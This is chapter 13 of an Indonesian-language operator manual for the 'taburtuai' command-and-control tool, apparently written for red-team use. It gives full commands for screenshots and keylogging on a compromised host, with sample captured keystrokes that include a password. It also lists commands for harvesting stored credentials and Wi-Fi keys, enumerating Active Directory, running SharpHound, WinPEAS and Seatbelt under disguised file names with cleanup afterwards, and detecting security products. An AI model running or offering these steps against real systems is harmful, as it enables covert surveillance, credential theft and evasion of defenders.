# 13 — Reconnaissance

## Screenshot Desktop

Ambil screenshot desktop target secara real-time.

### `screenshot <id>`

```
taburtuai(IP:PORT) › screenshot 2703886d --wait
```

```
[+] Screenshot captured.
    Resolution : 1920x1080
    Size       : 284,512 bytes
    Saved to   : /tmp/screenshot_2703886d_20260423_165512.png
```

### Simpan ke Path Tertentu

```
taburtuai(IP:PORT) › screenshot 2703886d --save ./screenshots/target_$(date +%Y%m%d_%H%M%S).png --wait
```

### Kapan Berguna

- Lihat apa yang sedang dikerjakan user (sensitif)
- Identifikasi software yang terbuka (email, dokumen, browser)
- Lihat apakah ada security tools yang visible
- Validasi bahwa agent berjalan di mesin yang benar

---

## Keylogger

Rekam semua keystroke yang diketikkan user di target. Data dikumpulkan di buffer agent
dan bisa diambil kapan saja.

### Start Keylogger

```
# Rekam selama 60 detik
taburtuai(IP:PORT) › keylog start 2703886d --duration 60

# Rekam tanpa batas waktu (hingga di-stop manual)
taburtuai(IP:PORT) › keylog start 2703886d --duration 0
```

```
[+] Keylogger started. Duration: 60s
[*] Use 'keylog dump 2703886d' to retrieve data.
[*] Use 'keylog stop 2703886d' to stop early.
```

### Ambil Data Keylogger

```
taburtuai(IP:PORT) › keylog dump 2703886d
```

```
[+] Keylog buffer (1,247 chars):

[2026-04-23 16:45:12] [Window: Google Chrome - Gmail]
hello john[ENTER]
how are you today[ENTER]

[2026-04-23 16:45:58] [Window: Windows PowerShell]
net user[ENTER]
net localgroup administrators[ENTER]

[2026-04-23 16:46:30] [Window: LastPass - Password Manager]
[CTRL+C]  ← user copy password

[2026-04-23 16:47:01] [Window: Remote Desktop Connection]
192.168.1.100[TAB]administrator[TAB]Admin@2026![ENTER]
```

### Stop Keylogger

```
taburtuai(IP:PORT) › keylog stop 2703886d
```

```
[+] Keylogger stopped. Final buffer retrieved (2,891 chars).
[data...]
```

### Clear Buffer

```
taburtuai(IP:PORT) › keylog clear 2703886d
[+] Keylog buffer cleared.
```

---

## Enumerasi Manual via Shell

Selain tool built-in, banyak informasi bisa didapat via `shell` atau `cmd`:

### Active Directory Enumeration

```
# Informasi domain
cmd 2703886d "net user /domain"
cmd 2703886d "net group /domain"
cmd 2703886d "net group 'Domain Admins' /domain"
cmd 2703886d "net group 'Enterprise Admins' /domain"
cmd 2703886d "nltest /domain_trusts"
cmd 2703886d "dsquery user -limit 0"

# Cari Domain Controller
cmd 2703886d "nltest /dclist:DOMAIN"
cmd 2703886d "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN"
```

### Local Enumeration

```
# Credential files
cmd 2703886d "dir C:\Users\windows\AppData\Roaming\FileZilla\"
cmd 2703886d "dir C:\Users\windows\.ssh\"
cmd 2703886d "dir C:\Users\windows\AppData\Local\Microsoft\Credentials\"
cmd 2703886d "dir C:\Users\windows\AppData\Roaming\Microsoft\Credentials\"

# Windows Credential Manager
cmd 2703886d "cmdkey /list"

# Registry credential search
cmd 2703886d "reg query HKLM /f password /t REG_SZ /s"
cmd 2703886d "reg query HKCU /f password /t REG_SZ /s"

# Wifi passwords
cmd 2703886d "netsh wlan show profiles"
cmd 2703886d "netsh wlan show profile name='SSID' key=clear"
```

### Files Menarik

```
# Cari file dengan keyword sensitif
cmd 2703886d "dir C:\ /s /b 2>nul | findstr /i \"password credential secret key config\""

# Cari file tipe tertentu
cmd 2703886d "dir C:\Users /s /b 2>nul | findstr /i \".kdbx .pfx .p12 .pem .key\""

# Recycle bin
cmd 2703886d "dir C:\$Recycle.Bin /s /a"
```

---

## Upload dan Jalankan Enumeration Tool

Untuk enumeration yang lebih komprehensif, upload tool:

### SharpHound (BloodHound collector)

```
# Upload SharpHound
files upload 2703886d /tools/SharpHound.exe "C:\Temp\svcs.exe"

# Jalankan
cmd 2703886d "C:\Temp\svcs.exe -c All --OutputDirectory C:\Temp" --timeout 600 --wait

# Download output
files download 2703886d "C:\Temp\20260423_BloodHound.zip" ./bloodhound.zip

# Cleanup
cmd 2703886d "del C:\Temp\svcs.exe && del C:\Temp\*BloodHound*"
```

### WinPEAS (Privilege Escalation Check)

```
files upload 2703886d /tools/winPEASx64.exe "C:\Temp\svc.exe"
cmd 2703886d "C:\Temp\svc.exe" --timeout 300 --wait
cmd 2703886d "del C:\Temp\svc.exe"
```

### Seatbelt (Security Checks)

```
files upload 2703886d /tools/Seatbelt.exe "C:\Temp\seat.exe"
cmd 2703886d "C:\Temp\seat.exe -group=all" --timeout 120 --wait
cmd 2703886d "del C:\Temp\seat.exe"
```

---

## Scenario: Reconnaissance Lengkap

```bash
# --- PHASE 1: System info dasar ---
cmd 2703886d "whoami /all"
cmd 2703886d "systeminfo"
cmd 2703886d "ipconfig /all"
cmd 2703886d "netstat -ano"

# --- PHASE 2: Screenshot dan keylog ---
screenshot 2703886d --wait
keylog start 2703886d --duration 300  # 5 menit

# --- PHASE 3: User & Group enumeration ---
cmd 2703886d "net user"
cmd 2703886d "net localgroup administrators"
cmd 2703886d "net user /domain"  # kalau domain-joined
cmd 2703886d "net group 'Domain Admins' /domain"

# --- PHASE 4: Security products ---
cmd 2703886d "tasklist | findstr -i \"defender crowdstrike sentinel cylance endpoint\""
cmd 2703886d "sc query windefend"

# --- PHASE 5: Files sensitif ---
cmd 2703886d "dir C:\Users\windows\Desktop"
cmd 2703886d "dir C:\Users\windows\Documents"
cmd 2703886d "cmdkey /list"

# --- PHASE 6: Ambil keylog ---
keylog dump 2703886d
keylog stop 2703886d
```

---

**Selanjutnya:** [14 — Network & Pivoting](14-network.md)
